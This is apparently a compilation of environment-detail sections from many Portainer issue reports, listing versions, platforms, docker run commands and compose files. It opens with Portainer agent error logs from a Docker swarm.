swarmstack_agent.0.3nsjixypeegm@swarmnode3 | 2019/06/18 05:31:23 [info] serf: eventmemberjoin: 3b505a83072d 10.0.0.8
swarmstack_agent.0.3nsjixypeegm@swarmnode3 | 2019/06/18 05:31:23 [info] - starting portainer agent version 1.3.0 on 0.0.0.0:9001 (cluster mode: true)
swarmstack_agent.0.3nsjixypeegm@swarmnode3 | 2019/06/18 05:31:24 [info] serf: eventmemberjoin: c4d6e5551b34 10.0.0.6
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:31:20 [info] serf: eventmemberjoin: 3b505a83072d 10.0.0.8
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:31:20 [info] - starting portainer agent version 1.3.0 on 0.0.0.0:9001 (cluster mode: true)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:31:23 [info] serf: eventmemberjoin: cb97d9e3debc 10.0.0.7
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:31:24 [info] serf: eventmemberjoin: c4d6e5551b34 10.0.0.6
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:32:37 http error: missing request signature headers (err=unauthorized) (code=403)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:32:47 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:32:47 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:40 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:40 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:43 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:43 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:53 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:55 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:55 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:55 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:55 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:33:56 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:34:40 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:34:40 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:34:47 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:34:47 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:35:06 http error: unable to execute cluster operation (err=get net/http: request canceled (client.timeout exceeded while awaiting headers)) (code=500)
swarmstack_agent.0.fx843wo9jnju@swarmnode1 | 2019/06/18 05:35:07 http error: unable to proxy the request via the docker socket (err=context canceled) (code=500) ```
* portainer version: 1.21
* docker version (managed by portainer): 18.09.2
* platform (windows/linux): linux 4.9.114-moby x86_64
* command used to start portainer: see "steps to reproduce..."
* browser: n/a
* portainer version: 1.22.0
* docker version (managed by portainer): 18.06.3-ce (swarm), agent version 1.4.0
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* browser: firefox
* command used to start portainer:
version: '3.2'
services: agent: image: portainer/agent environment: # required: should be equal to the service name prefixed by "tasks." when # deployed inside an overlay network agent_cluster_addr: tasks.agent # agent_port: 9001 #log_level: debug volumes: - /var/run/docker.sock:/var/run/docker.sock - /var/lib/docker/volumes:/var/lib/docker/volumes networks: - agent_network deploy: mode: global placement: constraints: [node.platform.os == linux] portainer: image: portainer/portainer command: -h tcp://tasks.agent:9001 --tlsskipverify ports: - "9000:9000" volumes: - portainer_data:/data networks: - agent_network deploy: mode: replicated replicas: 1 placement: constraints: [node.hostname == swarmnode2] networks: agent_network: driver: overlay attachable: true volumes: portainer_data:
* portainer version: 1.21.0
* docker version (managed by portainer):
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox 68.x / internetexplorer 11
* portainer version:1.20.2
* docker version (managed by portainer):18.09.5
* platform (windows/linux):linux(centos7+)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser:chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.6
* platform (windows/linux): windows (windows server 1809)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --name portainer --restart always -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine -v portainer_data:c:\\data --env http_proxy= --env https_proxy= portainer/portainer * browser: chrome additional details: c:\\programdata\\docker\\volumes\\portainer_data\\_data\\compose -folder is empty.
* portainer version: 1.20.1
* portainer version: v1.20.1
* docker version (managed by portainer): 18.09.2
* platform (windows/linux): windows 10
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer
* browser: microsoft edge
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.2, build 6247962
* platform (windows/linux): macos mojave
* command used to start portainer: `docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /users/maria/desktop/dockertest:/portainer_data portainer/portainer --admin-password='pass'`
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): docker version 18.03.1-ce, build 9ee9f40
* platform (windows/linux): freebsd
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): as per docs
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): docker 18.09.2 on linux, amd64
* platform (windows/linux): ubuntu 18.04.2 lts
* command used to start portainer (`docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer`):
* browser: chromium version 73.0.3683.86 (official build) **picture**
![screenshot from 2019-05-08 12-10-48](
* portainer version: 1.20.2
* docker version (managed by portainer): docker version 17.05.0-ce, build 89658be
* platform (windows/linux): ubuntu 16.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: google chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.3-ce
* platform (windows/linux): linux (ubuntu lts 18.04)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.4
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy portainer -c c:/.../portainer-stack.yml
* browser: edge preview
* portainer version:
* docker version (managed by portainer):1.20.2
* platform (windows/linux):linux core os
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):`sudo docker run -d -p 443:9000 --name portainer --restart always -v /home/core/cfssl:/certs -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer --ssl --sslcert /certs/portainer.crt --sslkey /certs/portainer.key`
* browser: firefox
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.4
* platform (windows/linux): linux (centos 7.5)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker stack deploy --compose-file=portainer-agent-stack.yml portainer
* browser: any (tested in chrome, firefox, opera)
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.3-ce (api: 1.38)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.3-ce (api: 1.38)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.3-ce (api: 1.38)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): docker version 18.09.4-ce, build d14af54266
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker-compose up -d portainer
* browser: firefox 66.0.2
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.4 (api: 1.39)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.4 (api: 1.39)
* platform (windows/linux): linux (ubuntu 18.04.2 lts)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start * browser: chrome
* portainer version: windows1803-amd64
* portainer agent version: windows1803-amd64
* docker version (managed by portainer):
* platform (windows/linux): windows
* command used to start portainer (`docker run -d --restart always --network portainer_agent_network --name portainer -v c:\\programdata\\docker\\containers\\portainer:c:\\data -p 9000:9000 portainer/portainer:windows1803-amd64 -h "tcp://tasks.portainer_agent:9001" --tlsskipverify`):
* browser: firefox
* portainer version: 1.20.2
* target docker version (the host/cluster you manage): 18.09.3
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run --name portainer -d -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/endpoints.json:/data/endpoints.json:ro -v /docker/portainer/certs/:/certs/:ro --restart always portainer/portainer --external-endpoints /data/endpoints.json --ssl --sslcert /certs/letsencrypt/lol/fullchain.pem --sslkey /certs/letsencrypt/lol/privkey.pem --no-analytics --sync-interval 120s --no-auth
* target swarm version (if applicable):
* browser: firefox quantum 66.0.1
* portainer version: windows1809-amd64-1.20.2
* docker version (managed by portainer): 18.09.03
* platform (windows/linux): windows server 2019 on azure (release 10.0.17763.379)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: ie
* windows firewall disabled and docker exposed to 0.0.0.0:2375
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): linux (coreos)
* command used to start portainer: docker run -p 9000:9000 portainer/portainer
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.2
* platform (windows/linux): linux (macos)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.3-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): -
* browser: chrome
* portainer version: 1.20.1
* docker version (managed by portainer): 17.06, swarm
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker service create --name=portainer --publish 9000:9000 --replicas=1 --constraint 'node.role == manager' --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock --secret cert.pem --secret ca.pem --secret key.pem portainer/portainer:1.20.1 --host=unix:///var/run/docker.sock --ssl --sslcert=/run/secrets/cert.pem --sslkey=/run/secrets/key.pem --tlscert=/run/secrets/cert.pem --tlskey=/run/secrets/key.pem --tlscacert=/run/secrets/ca.pem --tlsverify
* portainer version: 1.20.2
* docker version (managed by portainer): 18.09.3
* platform (windows/linux): windows 10 pro v1809
* command used to start portainer: `docker run -d --restart always --name portainer --isolation process -h portainer -p 9000:9000 -v c:\\programdata\\portainer:c:\\data -v //./pipe/docker_engine://./pipe/docker_engine portainer/portainer`
* browser: chrome
* portainer version: 1.20.2
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): command: ["--no-auth", "-h", "tcp://tasks.portainer_agent:9001", "--tlsskipverify"]
* browser: ios safari
* portainer version: 1.20.1
* docker version (managed by portainer): 18.06.10-ce
* platform (windows/linux): linux centos 7.5.1804 (core)
* command used to start portainer (`docker run -d -p 9000:9000 --name portainer -v /home/ash/certs:/certs -v portainer_data:/data portainer/portainer`):
* browser: firefox for centos linux - 60.3.0esr (64-bit)
* portainer version: 1.20.1
* docker version (managed by portainer): 1.13.1
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox 66.0b8
* portainer version: 1.19.2
* docker version (managed by portainer): swarm 18.09.2 * platform (windows/linux): linux
* portainer version:
1.20.1 * docker version (managed by portainer):
18.06.1-ce * platform (windows/linux):
centos-7 * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ```
version: \'3.2\' services: agent: image: portainer/agent environment: # required: should be equal to the service name prefixed by "tasks." when # deployed inside an overlay network agent_cluster_addr: tasks.agent # agent_port: 9001 # log_level: debug volumes: - /var/run/docker.sock:/var/run/docker.sock - /var/lib/docker/volumes:/var/lib/docker/volumes networks: - agent_network deploy: mode: global placement: constraints: [node.platform.os == linux] portainer: image: portainer/portainer command: -h tcp://tasks.agent:9001 --tlsskipverify ports: - "9000:9000" volumes: - portainer_data2:/data - /var/run/docker.sock:/var/run/docker.sock networks: - agent_network deploy: mode: replicated replicas: 1 placement: constraints: [node.role == manager] networks: agent_network: driver: overlay attachable: true volumes: portainer_data2: driver: local driver_opts: type: nfs o: addr=nas-address,rw,nolock,relatime,vers=3,rsize=131072,wsize=13107
2,namlen=255,hard,proto=tcp,timeo=600,retrans=2 device: ":/mnt/homes/docker/portainer" ```
* portainer version: 1.20.1
* docker version (managed by portainer): 18.09-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox
* portainer version: 1.20.0
* docker version (managed by portainer): docker version 18.09.1, build 4c52b90
* platform (windows/linux): centos linux release 7.6.1810 (core)
* portainer version: 1.20.1
* docker version (managed by portainer): 18.09
* platform (windows/linux): linux
* command used to start portainer (`docker run -d -p 9000:9000 -v $(pwd)/dist:/app -v /tmp/portainer:/data -v /var/run/docker.sock:/var/run/docker.sock:z --name portainer portainer/base /app/portainer --no-analytics --template-file /app/templates.json`):
* browser: firefox
* portainer version: 1.20.1
* docker version (managed by portainer): 18.09.1, docker for windows 2.0.0.2
* platform (windows/linux): windows 10 1809, windows containers
* command used to start portainer (`docker run -p 9000:9000 -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine portainer/portainer`):
* browser: edge, firefox, chrome
* portainer version: 1.20.1
* docker version (managed by portainer): 18.09.1, docker for windows 2.0.0.2
* platform (windows/linux): windows 10 1809, windows containers
* command used to start portainer (`docker run -p 9000:9000 -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine portainer/portainer`):
* browser: edge, firefox, chrome
* portainer version: 1.20.1
* docker version (managed by portainer):
* platform (windows/linux): ubuntu 18.04
* browser: chrome version 71.0.3578.98
* portainer version: 1.20.1
* docker version (managed by portainer): 18.09.1
* platform (windows/linux): centos 7
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
using the following `docker-compose.yml` file
version: '3'
services: portainer: image: portainer/portainer:latest container_name: portainer ports: - "9000:9000" volumes: - ./data:/data - /var/run/docker.sock:/var/run/docker.sock restart: always
* browser: macos firefox 65
* portainer version: 1.20.1
* docker version (managed by portainer): docker version 18.09.0, build 4d60db4
* platform (windows/linux): linux
* command used to start portainer: `-h tcp://tasks.portainer_agent:9001 --tlsskipverify --no-auth --templates `
* browser: chrome
* portainer version: 1.20.0
* docker version (managed by portainer): 18.03.1-ce, build 9ee9f40
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: google chrome
* portainer version: 1.20.0
* docker version (managed by portainer): 18.09.1
* platform (windows/linux): linux x86_64 debian gnu/linux 9 (stretch)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 portainer/portainer --no-auth
* browser: chrome 72
* portainer version: 1.19.2
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): swarm mode with portainer agent
* browser: none
* portainer version: 1.20.0
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `portainer --external-endpoints /endpoints.json --no-snapshot --templates "`
* browser: chrome
* portainer version: 1.20.0
* portainer agent version: 1.2.0 and 1.1.2
* docker version: docker version 18.06.1-ce, build e68fc7a
* platform: ubuntu 16.04.4 x64
* command used to start portainer: `docker run --name portainer -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer:1.20.0`
* browser: google chrome version 73.0.3667.0 (official build) canary (64-bit)
* portainer version: 1.20.0-dev
* docker version (managed by portainer):
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): yarn start:client
* browser: chrome
this behaviour is most likely caused by an xss countermeasure in the input field
* portainer version: 1.20.0
* docker version (managed by portainer): 18.09-ce, build 4d60db4
* platform (windows/linux): macos 10.14.03
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: google chrome version 70.0.3538.110 (official build) (64-bit)
* portainer version:1.20.0
* docker version: 18.09.1
* platform: debian 9.6
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* entrypoint: local
* portainer version: 1.20.0
* docker version: mix of 18.09.1-ce and 18.06.1-ce
* platform: linux
* command used to start portainer: `curl -l -o portainer-agent-stack.yml && docker stack deploy --compose-file=portainer-agent-stack.yml portainer`
* browser: chrome 71.0.3578.98
* portainer version: 1.20.0
* docker version (managed by portainer): 18.09.0
* platform (windows/linux): fedora server 29
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: google chrome
* portainer version: 1.20.0
* docker version (managed by portainer): 18.09.0
* platform (windows/linux): linux tbook 4.9.0-4-amd64 #1 smp debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 gnu/linux
* browser: chrome
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`) ```
version: \'3.2\' services: agent: image: portainer/agent environment: # required: should be equal to the service name prefixed by "tasks." when # deployed inside an overlay network agent_cluster_addr: tasks.agent # agent_port: 9001 # log_level: debug volumes: - /var/run/docker.sock:/var/run/docker.sock - /var/lib/docker/volumes:/var/lib/docker/volumes networks: - cluster deploy: mode: global placement: constraints: [node.platform.os == linux] portainer: image: portainer/portainer command: -h tcp://tasks.agent:9001 --tlsskipverify ports: - "9000:9000" volumes: - portainer_data:/data networks: - cluster deploy: mode: replicated replicas: 1 placement: constraints: [node.role == manager] networks: cluster: external: true volumes: portainer_data:
* portainer version: `1.20.0`
* docker version (managed by portainer): `version: 18.09.0`
* platform (windows/linux): ubuntu 18.04.1 lts (gnu/linux 4.15.0-1026-gcp x86_64) (4.15.0-1026-gcp)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: any (safari/chrome/firefox)
* portainer version:
1.20.0 (happened on older versions as well)
* docker version (managed by portainer):docker 18.09.0
* platform (windows/linux):
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
portainer is handling this and/or docker systemd service.
firefox ios
* portainer version:1.20.0
* docker version (managed by portainer): 17.05.0-ce
* platform (windows/linux): synology nas (ds1515+, 12 gb ram, latest os version at this time=dsm 6.2.1-23824 update 2)
* command used to start portainer:
"docker-compose up" using this docker-compose.yml file: ```
version: '2' services: portainer: image: portainer/portainer container_name: portainer command: -h unix:///var/run/docker.sock privileged: true restart: always ports: - 9000:9000 volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:/data logging: driver: json-file environment: - tz=europe/stockholm volumes: portainer_data: ```
have tried with and without the "privileged: true" line, no change
* browser: chrome
pretty sure it's not a browser issue though.
* portainer version: 1.20.0
* docker version (managed by portainer): 17.06.0-ce
* platform (windows/linux): photon os
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /path/on/host/data:/data portainer/portainer
* browser: google chrome latest **aditional**
even editing a containers exposed port and redeploing it has the same behavior
* portainer version: 1.20.0
* docker version (managed by portainer): 18.06
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox 63
* portainer version: 1.20.0
* docker version (managed by portainer): 2.0.0.0-mac81
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
* portainer version: 1.20.0
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): linux
* command used to start portainer: ```docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /mnt/zfs/deadpool0/docker/portainer:/data portainer/portainer:1.20.0```
* browser: n/a
swarm cluster with one manager and 2 workers
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06-ce
* platform (windows/linux): linux ubuntu 16.04
* command used to start portainer : docker stack deploy -c core.yml core
* browser: any
* portainer version: 1.19.2
* docker version (managed by portainer): docker-ce 18.06
* platform (windows/linux): ubuntu linux 14.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: firefox 63
* portainer version: "latest" at the time of writing
* docker version: docker version 18.09.0, build 4d60db4
* platform (windows/linux): linux
* command used to start portainer: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer`
* browser: chrome version 72.0.3626.7
* portainer version: 1.19.2 * docker version (managed by portainer): 18.09.0
* platform (windows/linux): debian gnu/linux 9 (stretch)
* command used to start portainer: using the following `docker-compose.yml`: ```
version: '3.3'
services: portainer: image: portainer/portainer networks: - default - traefik_default labels: - com.centurylinklabs.watchtower.enable=true - traefik.enable=true - traefik.backend=portainer - traefik.frontend.rule=host:portainer.test.org - traefik.docker.network=traefik_default - traefik.port=9000 - traefik.default.protocol=http - portainer.hidden=true restart: always command: -l "portainer.hidden=yes" --logo " " volumes: - /srv/docker/portainer/data:/data - /var/run/docker.sock:/var/run/docker.sock - /etc/localtime:/etc/localtime:ro - /etc/timezone:/etc/timezone:ro
networks: traefik_default: external: true
* browser: %
* portainer version: 1.20dev
* docker version (managed by portainer): 18.09.0
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
* browser: chrome
request url: ``` ``` http response: ```{"message":"get http:: http: no host in request url"}``` the logs do not specify anything related to image pulling
* portainer version: ```1.19.2```
* docker version (managed by portainer): ```docker version 18.09.0, build 4d60db4```
* platform (windows/linux): ```linux (debian 9, 4.9.0-8-amd64 #1 smp debian 4.9.130-2)```
* command used to start portainer ```docker run -d -p 9050:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer```
* browser: ```google chrome 70.0.3538.102 (official build) (64-bit)```
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): see reference stack
* browser: n/a
* portainer version: 1.19.2-26-g719299d7 (fix(container-stat) : exclude cache from the memory usage chart to avoid misinterpret (#2371))
* portainer version: 1.19.2-34-g07c1e1bc feat(container-stats): display cache in memory usage chart (#2383)
* docker version (managed by portainer): 18.09
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer`):
* browser: firefox 63
* portainer version: 1.19.2
* docker version (managed by portainer): standalone 17.05.0-ce
* platform (windows/linux): synology 6.2.1
* portainer version: 1.19.2 and agent 1.1.1
* docker version (managed by portainer): 18.03.1-ce
* platform (windows/linux): ubuntu 16.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): ["-h", "unix:///var/run/docker.sock"]
* browser: safari
* portainer version: 1.19.2
* docker version (managed by portainer): swarm 18.01.6-ce
* platform (windows/linux): linux
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.0-ce
* platform (windows/linux): centoos 7.4
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
`docker stack deploy --with-registry-auth -c /home/some-user/stack/portainer.yml portainer`
the contents of the stack file:
version: '3.4' services: portainer: hostname: portainer image: xxxx.xxx.com:5000/portainer/portainer:1.19.2 ports: - 9000:9000 networks: - xxx-network volumes: - /mnt/portainer:/data - /var/run/docker.sock:/var/run/docker.sock - /etc/localtime:/etc/localtime:ro deploy: restart_policy: condition: on-failure placement: constraints: - node.labels.portainer == true networks: xxx-network: external: true ``` * browser:
chromium for linux
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): ubuntu 16.04
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): `docker run -d --name portainer --restart=always -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer`
* browser: firefox 62.0.3
* portainer version: 1.19.2
* docker version (managed by portainer): ce 18.06.1-ce, build e68fc7a
* platform (windows/linux): linux (ubuntu 18.04)
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run -d \\
-p 9000:9000 \\
--name portainer \\
--restart always \\
-v /var/run/docker.sock:/var/run/docker.sock \\
-v /srv/letsencrypt:/srv/letsencrypt \\
-v portainer_data:/data \\
portainer/portainer \\
--sslcert /srv/letsencrypt/domain.com/fullchain.pem \\
--sslkey /srv/letsencrypt/domain.com/privkey.pem \\
--tlsskipverify
* browser: latest safari, chrome, and firefox (on macos mojave)
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.1-ce
* ubuntu 16.04.5 kernel 4.4.0-134
* command used to start portainer : docker service create --name portainer --publish 9000:9000 --constraint 'node.role == manager' --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock --mount type=bind,src=/var/lib/portainer,dst=/data portainer/portainer -h unix:///var/run/docker.sock
* browser: all
* portainer version: lasted
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): windows
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d -p 9000:9000 --name portainer --restart always -v \\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine -v e:\\programdata\\portainer:c:\\data portainer/portainer
* portainer version: both latest and develop tag
* docker version (managed by portainer): ```docker version 18.06.1-ce, build e68fc7a```
* platform (windows/linux): ```linux 4.9.0-8-amd64 smp debian 4.9.110-3+deb9u6 (2018-10-08) x86_64 gnu/linux```
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):```docker run --name portainer -d -p 80:9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer:develop```
* portainer version: 1.19.2
* docker version (managed by portainer): 1.13.1
* platform (windows/linux): linux
* portainer version: 1.19.2
* docker version (managed by portainer): 1.13.1
* platform (windows/linux): linux
* portainer version: 1.19.1
* docker version (managed by portainer): 18.06
* platform (windows/linux): linux x64
* command used to start portainer (docker compose):
* browser: firefox
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.1-ce * platform (windows/linux): linux
* portainer version: 1.19.2 (fresh install)
client: version: 18.06.1-ce api version: 1.38 go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:24:51 2018 os/arch: linux/amd64 experimental: false server: engine: version: 18.06.1-ce api version: 1.38 (minimum version 1.12) go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:23:15 2018 os/arch: linux/amd64 experimental: false
* portainer version: 1.22
* docker version (managed by portainer): 19.03
* platform (windows/linux): linux (ubuntu 18.04.2 lts) * command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
* browser: chrome
* portainer version: 1.19.2
* docker details :
client: version: 18.06.1-ce api version: 1.38 go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:24:51 2018 os/arch: linux/amd64 experimental: false server: engine: version: 18.06.1-ce api version: 1.38 (minimum version 1.12) go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:23:15 2018 os/arch: linux/amd64 experimental: false
* portainer version: 1.19.2 with amazon-ecr-credential-helper
* docker version (managed by portainer): 18.06.1-ce
* platform: linux
* command used to start portainer: `docker stack deploy -f docker-compose-portainer.yml portainer -p`
* browser: chrome
* portainer version: 1.19.2
* docker version (managed by portainer): 18.06.1-ce
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`):
docker run --restart always -d -p 9000:9000 -v /mnt/path/portainer/:/data -v /var/run/docker.sock:/var/run/docker.sock --name portainer portainer/portainer:latest
* portainer version: 1.19.2
* docker version (managed by portainer):
from redhat official repositories
docker-client-1.13.1-74.git6e3bb8e.el7.x86_64
docker-common-1.13.1-74.git6e3bb8e.el7.x86_64
docker-rhel-push-plugin-1.13.1-74.git6e3bb8e.el7.x86_64
